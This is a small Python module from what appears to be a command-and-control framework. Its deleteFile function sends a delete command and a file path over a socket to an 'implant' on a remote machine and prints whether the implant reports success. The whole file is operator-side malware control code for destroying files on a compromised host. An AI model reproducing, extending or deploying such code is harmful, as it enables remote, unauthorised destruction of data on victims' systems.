# Patrick Sacchet
# Version 1.0
# Serves to implement interfacing with delete file functionality 

SUCCESS = 1
FAILURE = 0

# Command value
DEL = 4


'''
Description:
    Performs delete file functionality; communicates with C2 server and handles responses
Params:
    sock - sock object with connection already established
    filepath - path to remote file to delete
Returns:
    SUCCESS or FAILURE 
'''
def deleteFile(sock, filePath):
    try:
        # First tell our implant we want a delete file
        print("Sending command...")
        sock.send(bytes(str(DEL), "utf-8") + b'\x00')

        # Send filepath to delete
        print("Sending file path...")
        sock.send(filePath + b'\x00')

        data = sock.recv(1024)
        data = data.strip()
        data = data.decode('utf-8')

        if (data == "SUCCESS"):
            print("Successful delete file!\n")

        else:
            print("Implant returned FAILURE!\n")


    except Exception as e:
        print("ERROR: Could not send delete file to implant: ", e)
        return FAILURE
    
    return SUCCESS
